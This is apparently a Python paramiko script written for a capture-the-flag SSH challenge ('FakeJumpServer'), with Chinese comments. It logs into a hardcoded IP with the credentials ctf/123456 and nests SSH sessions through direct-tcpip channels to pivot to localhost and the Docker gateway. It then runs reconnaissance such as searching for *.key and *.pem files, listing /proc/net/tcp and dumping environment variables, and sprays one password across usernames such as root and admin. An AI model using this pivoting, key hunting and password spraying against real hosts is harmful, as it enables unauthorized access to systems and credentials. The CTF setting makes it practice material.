import paramiko
import socket
import time
import sys

"""
关键发现：
1. 我们可以通过direct-tcpip通道连接回dropbear自己
2. 用相同的凭据ctf/123456可以认证成功
3. 这创造了一个嵌套的SSH会话

FakeJumpServer的核心思想可能是：
- 恶意跳板机可以劫持direct-tcpip请求
- 当客户端以为在连接真正的目标时，实际上连接的是跳板机伪造的服务

让我测试一下是否可以通过嵌套的SSH会话做一些不同的事情
"""

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(transport, cmd, timeout=10):
    """通过transport执行命令"""
    session = transport.open_session()
    session.exec_command(cmd)
    session.settimeout(timeout)
    
    out = b""
    try:
        while True:
            chunk = session.recv(4096)
            if not chunk:
                break
            out += chunk
    except:
        pass
    
    return out.decode()

def test_nested_shell_escape():
    """
    测试通过嵌套shell逃逸
    """
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport1 = ssh.get_transport()
    
    print("[*] 第一层连接完成")
    print(f"[*] 第一层host key: {transport1.get_remote_server_key().get_fingerprint().hex()}")
    
    # 通过第一层执行命令
    print("\n[*] 通过第一层执行命令:")
    print(exec_cmd(transport1, "id"))
    print(exec_cmd(transport1, "hostname"))
    print(exec_cmd(transport1, "pwd"))
    
    # 建立第二层
    print("\n[*] 建立第二层连接...")
    channel1 = transport1.open_channel("direct-tcpip", ("127.0.0.1", 22), ('127.0.0.1', 0))
    transport2 = paramiko.Transport(channel1)
    transport2.start_client()
    
    transport2.auth_password(USER, PASSWD)
    print("[+] 第二层认证成功")
    print(f"[*] 第二层host key: {transport2.get_remote_server_key().get_fingerprint().hex()}")
    
    # 通过第二层执行命令
    print("\n[*] 通过第二层执行命令:")
    print(exec_cmd(transport2, "id"))
    print(exec_cmd(transport2, "hostname"))
    print(exec_cmd(transport2, "pwd"))
    
    # 检查环境变量差异
    print("\n[*] 比较环境变量:")
    env1 = exec_cmd(transport1, "printenv")
    env2 = exec_cmd(transport2, "printenv")
    
    print("第一层环境:")
    for line in env1.split('\n'):
        print(f"  {line}")
    
    print("\n第二层环境:")
    for line in env2.split('\n'):
        print(f"  {line}")
    
    transport2.close()
    ssh.close()

def test_shell_pty():
    """测试PTY shell是否有不同的行为"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 测试PTY shell...")
    
    transport = ssh.get_transport()
    channel = transport.open_session()
    channel.get_pty()
    channel.invoke_shell()
    
    time.sleep(0.5)
    
    # 读取欢迎信息
    if channel.recv_ready():
        print(f"欢迎信息: {channel.recv(4096).decode()}")
    
    # 发送命令
    channel.send("id\n")
    time.sleep(0.5)
    print(f"id: {channel.recv(4096).decode()}")
    
    channel.send("ls -la /\n")
    time.sleep(0.5)
    print(f"ls: {channel.recv(4096).decode()}")
    
    channel.close()
    ssh.close()

def check_listen_ports():
    """检查监听的端口"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查网络连接...")
    
    transport = ssh.get_transport()
    
    # 通过cat /proc/net/tcp查看
    session = transport.open_session()
    session.exec_command("cat /proc/net/tcp")
    out = session.recv(4096).decode()
    print("TCP连接:")
    print(out)
    
    # 检查/proc/net/tcp6
    session = transport.open_session()
    session.exec_command("cat /proc/net/tcp6")
    out = session.recv(4096).decode()
    print("\nTCP6连接:")
    print(out)
    
    ssh.close()

def explore_dropbear_config():
    """探索dropbear的配置"""
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    print("[*] 探索文件系统...")
    
    for cmd in [
        "find / -name 'dropbear*'",
        "find / -name '*.key' -o -name '*.pem'",
        "cat /proc/1/cmdline | od -c",
        "ls -la /run/host/",
        "ls -la /run/host/unix-export/",
        "ls -la /run/host/incoming/"
    ]:
        print(f"\n命令: {cmd}")
        session = transport.open_session()
        session.exec_command(cmd)
        session.settimeout(5)
        try:
            out = session.recv(4096).decode()
            print(out[:500])
        except:
            print("(超时)")
    
    ssh.close()

def test_different_users():
    """测试不同用户名的登录"""
    
    print("[*] 测试不同用户名...")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 通过通道测试不同用户
    users = ["root", "admin", "user", "flag", "ubuntu", "test"]
    
    for user in users:
        try:
            channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
            target_transport = paramiko.Transport(channel)
            target_transport.start_client()
            
            target_transport.auth_password(user, PASSWD)
            print(f"[+] {user}:{PASSWD} 成功!")
            
            session = target_transport.open_session()
            session.exec_command("id")
            print(f"    id: {session.recv(4096).decode()}")
            
            target_transport.close()
        except paramiko.AuthenticationException:
            print(f"[-] {user}:{PASSWD} 失败")
        except Exception as e:
            print(f"[-] {user}: 错误 - {e}")
    
    ssh.close()

if __name__ == "__main__":
    print("="*60)
    print("[*] 深入探索嵌套SSH")
    print("="*60)
    
    print("\n[1] 测试嵌套shell")
    test_nested_shell_escape()
    
    print("\n[2] 检查监听端口")
    check_listen_ports()
    
    print("\n[3] 探索dropbear配置")
    explore_dropbear_config()
    
    print("\n[4] 测试不同用户")
    test_different_users()
